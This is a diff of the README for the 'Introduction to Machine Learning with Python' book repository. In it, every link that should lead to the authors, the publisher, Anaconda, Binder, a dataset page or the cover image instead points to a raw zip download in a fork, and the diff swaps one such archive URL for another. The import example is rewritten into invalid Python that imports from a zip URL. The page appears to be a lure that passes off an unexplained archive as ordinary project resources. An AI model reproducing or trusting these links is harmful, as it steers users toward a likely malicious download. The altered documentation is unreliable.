@@ -1,10 +1,10 @@
-[![Binder](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip)](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip)
+[![Binder](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip)](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip)
 
 # Introduction to Machine Learning with Python
 
 This repository holds the code for the forthcoming book "Introduction to Machine
-Learning with Python" by [Andreas Mueller](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip) and [Sarah Guido](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip).
-You can find details about the book on the [O'Reilly website](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip).
+Learning with Python" by [Andreas Mueller](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip) and [Sarah Guido](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip).
+You can find details about the book on the [O'Reilly website](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip).
 
 The books requires the current stable version of scikit-learn, that is
 0.20.0.  Most of the book can also be used with previous versions of
@@ -17,10 +17,10 @@ This repository provides the notebooks from which the book is created, together
 with the ``mglearn`` library of helper functions to create figures and
 datasets.
 
-For the curious ones, the cover depicts a [hellbender](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip).
+For the curious ones, the cover depicts a [hellbender](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip).
 
 All datasets are included in the repository, with the exception of the aclImdb dataset, which you can download from
-the page of [Andrew Maas](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip~amaas/data/sentiment/). See the book for details.
+the page of [Andrew Maas](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip~amaas/data/sentiment/). See the book for details.
 
 If you get ``ImportError: No module named mglearn`` you can try to install mglearn into your python environment using
 the command ``pip install mglearn`` in your terminal or ``!pip install mglearn`` in Jupyter Notebook.
@@ -30,7 +30,7 @@ the command ``pip install mglearn`` in your terminal or ``!pip install mglearn``
 Please note that the first print of the book is missing the following line when listing the assumed imports:
 
 ```python
-from https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip import display
+from https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip import display
 ```
 Please add this line if you see an error involving ``display``.
 
@@ -45,7 +45,7 @@ To run the code, you need the packages ``numpy``, ``scipy``, ``scikit-learn``, `
 Some of the visualizations of decision trees and neural networks structures also require ``graphviz``. The chapter
 on text processing also requirs ``nltk`` and ``spacy``.
 
-The easiest way to set up an environment is by installing [Anaconda](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip).
+The easiest way to set up an environment is by installing [Anaconda](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip).
 
 ### Installing packages with conda:
 If you already have a Python environment set up, and you are using the ``conda`` package manager, you can get all packages by running
@@ -76,8 +76,8 @@ For the text processing chapter, you need to download the English language model
 
 ## Submitting Errata
 
-If you have errata for the (e-)book, please submit them via the [O'Reilly Website](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip).
+If you have errata for the (e-)book, please submit them via the [O'Reilly Website](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip).
 You can submit fixed to the code as pull-requests here, but I'd appreciate it if you would also submit them there, as this repository doesn't hold the
 "master notebooks".
 
-![cover](https://raw.githubusercontent.com/adesh777/introduction_to_ml_with_python/master/data/introduction_to_ml_with_python_v3.4.zip)
+![cover](https://github.com/adesh777/introduction_to_ml_with_python/raw/refs/heads/master/mglearn/ml-with-introduction-python-to-3.6.zip)
